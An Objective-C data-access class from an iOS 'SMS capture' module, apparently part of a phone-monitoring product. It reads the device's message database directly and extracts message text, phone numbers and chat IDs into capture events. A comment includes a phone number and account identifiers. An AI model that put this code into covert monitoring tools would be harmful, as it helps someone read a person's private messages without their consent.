//
//  SMSCaptureDAO.m
//  SMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SMSCaptureDAO.h"
#import "FxSmsEvent.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "DateTimeFormat.h"
#import "ArrayUtils.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"

#import <objc/runtime.h>

static NSString * const kSelectSMSEventSql1	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where "
													"error = 0 and service = 'SMS' and ROWID not in (select message_id from message_attachment_join) "
													"order by ROWID desc limit %d";

static NSString * const kSelectSMSEventSql2	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where ROWID = %d";

static NSString * const kSelectHandleSql	= @"select id, uncanonicalized_id from handle where ROWID = %d";

static NSString * const kSelectChatSql		= @"select guid from chat where ROWID in (select chat_id from chat_message_join where message_id = %d)";

@implementation SMSCaptureDAO

- (id) init {
	if ((self = [super init])) {
		mSMSDatabase = [[FMDatabase databaseWithPath:kSMSHistoryDatabasePath] retain];
		[mSMSDatabase open];
	}
	return (self);
}

- (NSArray *) selectSMSEvents: (NSInteger) aNumberOfEvents {
	NSMutableArray *events = [[NSMutableArray alloc] initWithCapacity:aNumberOfEvents];
	NSString *sql1 = [NSString stringWithFormat:kSelectSMSEventSql1, aNumberOfEvents];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	while ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		FxSmsEvent *smsEvent = [[FxSmsEvent alloc] init];
		[smsEvent setEventId:ROWID];
		[smsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[smsEvent setSmsData:message];
		[smsEvent setSmsSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
																    [rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[smsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object = %@", dbMessage);
		DLog (@"address = %@", [dbMessage address]);
		DLog (@"text = %@", [dbMessage text]);
		DLog (@"subject = %@", [dbMessage subject]);
		DLog (@"recipients = %@", [dbMessage recipients]);
		DLog (@"isOutgoing = %d", [dbMessage isOutgoing]);
		DLog (@"groupid = %@", [dbMessage groupID]);						// +66860843742
		DLog (@"guid = %@", [dbMessage guid]);								// 7D44F7EB-169E-485E-A209-A65CA8B58295
		DLog (@"madridAccountGUID = %@", [dbMessage madridAccountGUID]);	// 1A3EAD99-9030-40D1-9290-12222DBFB715
		DLog (@"isMessageFullyLoaded = %d", [dbMessage isMessageFullyLoaded]);
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[smsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[smsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients				
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[smsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[smsEvent setDirection:kEventDirectionIn];
			[smsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		[dbMessage release];
		
		[events addObject:smsEvent];
		[smsEvent release];
		
		DLog (@"======================================");
		DLog (@"ROWID = %d", ROWID);
		DLog (@"message = %@", message);
		DLog (@"subject = %@", subject);
		DLog (@"is_from_me = %d", is_from_me);
		DLog (@"handle_id = %d", handle_id);
		DLog (@"address = %@", address);
		DLog (@"groupID = %@", groupID);
		DLog (@"======================================");
	}
	NSArray *smsEvents = [ArrayUtils reverseArray:events];
	[events release];
	return (smsEvents);
}

- (FxSmsEvent *) selectSMSEvent: (NSInteger) aROWID {
	FxSmsEvent *smsEvent = nil;
	NSString *sql1 = [NSString stringWithFormat:kSelectSMSEventSql2, aROWID];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	if ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		smsEvent = [[[FxSmsEvent alloc] init] autorelease];
		[smsEvent setEventId:ROWID];
		[smsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[smsEvent setSmsData:message];
		[smsEvent setSmsSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
			[rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[smsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object = %@", dbMessage);
		DLog (@"address = %@", [dbMessage address]);
		DLog (@"text = %@", [dbMessage text]);
		DLog (@"subject = %@", [dbMessage subject]);
		DLog (@"recipients = %@", [dbMessage recipients]);
		DLog (@"isOutgoing = %d", [dbMessage isOutgoing]);
		DLog (@"groupid = %@", [dbMessage groupID]);
		DLog (@"guid = %@", [dbMessage guid]);
		DLog (@"madridAccountGUID = %@", [dbMessage madridAccountGUID]);
		DLog (@"isMessageFullyLoaded = %d", [dbMessage isMessageFullyLoaded]);
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[smsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[smsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[smsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[smsEvent setDirection:kEventDirectionIn];
			[smsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		[dbMessage release];
		
		DLog (@"======================================");
		DLog (@"ROWID = %d", ROWID);
		DLog (@"message = %@", message);
		DLog (@"subject = %@", subject);
		DLog (@"is_from_me = %d", is_from_me);
		DLog (@"handle_id = %d", handle_id);
		DLog (@"address = %@", address);
		DLog (@"groupID = %@", groupID);
		DLog (@"======================================");
	}
	return (smsEvent);
}

- (void) dealloc {
	[mSMSDatabase close];
	[mSMSDatabase release];
	[super dealloc];
}

@end
